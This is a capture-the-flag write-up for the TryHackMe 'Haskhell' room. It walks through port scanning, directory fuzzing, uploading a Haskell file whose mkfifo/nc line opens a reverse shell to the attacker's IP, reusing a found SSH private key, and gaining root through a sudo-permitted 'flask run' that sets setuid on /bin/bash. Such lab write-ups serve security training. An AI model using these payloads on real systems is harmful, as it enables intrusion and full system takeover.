---

title: "TryHackMe Writeup - Haskshell"

categories: [Tryhackme,Linux,easy]

tags: [file_upload,haskell,flask(sudo_misconfig),easy]

image: https://cdn-icons-png.flaticon.com/512/5968/5968259.png
---


THM - [https://tryhackme.com/room/haskhell](https://tryhackme.com/room/haskhell)



## Enumeration :

### Port scanning

As always, we start by scanning the target machine’s open ports:

```bash
┌──(root㉿kali)-[~/Desktop/thm/hakshell]
└─# rustscan -a $ip --range 1-65535 -- -A -sCV -oA $ip  -O

```

Results:

```bash

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD6azVu3Hr+20SblWk0j7SeT8U3VySD4u18ChyDYyOoZiza2PTe1qsuwnw06/kboHaLejqPmnxkMDWgEeXoW0L11q2D8mfSf8EVvk++7bNqQ0mlkjdcknOs11mdYqSOkM1yw06LolltKtjlf/FpT706QFkRKQO30fT4YgKY6GD71aYdafhTBgZlXA51pGyruDUOP+lqhVPvLZJnI/oOTWkv5kT0a3T+FGRZfEi+GBrhvxP7R7n3QFRSBDPKSBRYLVdlSYXPD83P1pND6F/r3BvyfHw4UY0yKbw+ntvhiRcUI2FYyN5Vj1Jrb6ipCnp5+UcFdmROOHSgWS5Qzzx5fPZB
|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMx1lBsNtSWJvxM159Ahr110Jpf3M/dVqblDAoVXd8QSIEYIxEgeqTdbS4HaHPYnFyO1j8s6fQuUemJClGw3Bh8=
|   256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICPmznEBphODSYkIjIjOA+0dmQPxltUfnnCTjaYbc39R
5001/tcp open  http    syn-ack ttl 60 Gunicorn 19.7.1
|_http-title: Homepage
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: gunicorn/19.7.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Sony X75CH-series Android TV (Android 5.0) (92%), Linux 2.6.32 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%), QNAP QTS 4.0 - 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).

```

### Web Enumeration

From the result from nmap scan , there is web_server running on port 5001.

![Untitled](/assets/img/Untitled.png){: w="700" h="400" }

Initiated  Fuzzing on the web_server, found a  hidden directory called `/submit` .

```bash
┌──(root㉿kali)-[~/Desktop/thm/hakshell/web_fuzz]
└─# ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u <http://$ip:5001/FUZZ> -ic -v -e .php,.html,.txt -o fuzz -of all
```

Results :

```bash
[Status: 200, Size: 237, Words: 48, Lines: 9, Duration: 1090ms]
| URL | <http://10.10.185.37:5001/submit>
    * FUZZ: submit
```

Up on visiting the endpoint `/submit` , there is a file upload function for submtting the assignments

# Foothold

From the information from the  home page of the web_page , they are learning haskell programming languae and need to submit their assignment on haskell and upload the haskell program.

Upload a malicious below haskell code to file `rev.hs` , to receive revese shell from the machine

```haskell
module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.17.4.74 443 >/tmp/f"
```

Start a listener on the attacker machine

```bash
──(root㉿kali)-[~/Desktop/thm/hakshell]
└─# pwncat-cs -lp 44
```

Now upload the reverse shell haskell file and click on upload

![Untitled](/assets/img/Untitled_1.png)

Upon clicking upload , we receive a reverse shell as a `flask` service account  user

![Untitled](/assets/img/Untitled_2.png)

## Lateral Movement

Under the home directory of the user name `prof` contains ssh private key.

![Untitled](/assets/img/Untitled_3.png)

&nbsp;


Copy the private key to the attacker machine and save it to file name  `id_rsa.prof` and change the permission of the file.

```bash
┌──(root㉿kali)-[~/Desktop/thm/hakshell/ssh]
└─#chmod 600 id_rsa.prof
```

&nbsp;

Run the following ssh command  and we login into ssh as user `prof`.

```bash
┌──(root㉿kali)-[~/Desktop/thm/hakshell/ssh]
└─# ssh prof@$ip -i id_rsa.prof
```

![Untitled](/assets/img/Untitled_4.png)

## Privilege Escalation

By running the `sudo -ll`  , we can run the `/usr/bin/flask run`  as root user ,due to misconfiguraton of sudo.

![Untitled](/assets/img/Untitled_5.png)

&nbsp;


Copy the below python script to file name called `server.py`

```python
from flask import Flask
import subprocess

app = Flask(__name__)

@app.route("/")

def hello():
    cmd = ["chmod","+s","/bin/bash"]
    p = subprocess.Popen(cmd, stdout = subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
    out,err = p.communicate()
    return out
if __name__ == "__main__" :
    app.run()
```

&nbsp;


Export the environment varible as below

```bash
prof@haskhell:~$ export FLASK_APP=server.py
```

&nbsp;


Now run the sudo as root user to run the command `/usr/bin/flask run`


```bash
prof@haskhell:~$ sudo -u root /usr/bin/flask run &
```

&nbsp;


Do curl request on the localhost ,in which flask server is listening on port 5000

```bash
prof@haskhell:~$ curl http://127.0.0.1:5000/
```

![Untitled](/assets/img/Untitled_6.png)

&nbsp;


When we list out the the binary , we have a setuid bit is set on the `/bin/bash` binary.
Run the below command to get user as root

```bash
prof@haskhell:~$ /bin/bash -p
```

![Untitled](/assets/img/Untitled_7.png)

&nbsp;


The simplest way to achieve root shell .

Copy the below python script to file name called `server.py`

```python
import os

os.system("/bin/bash")
```

Execute the following commands

```bash
prof@haskhell:~$ export FLASK_APP=server.py
prof@haskhell:~$
prof@haskhell:~$ sudo -u root /usr/bin/flask run
```

![Untitled](/assets/img/Untitled_8.png)

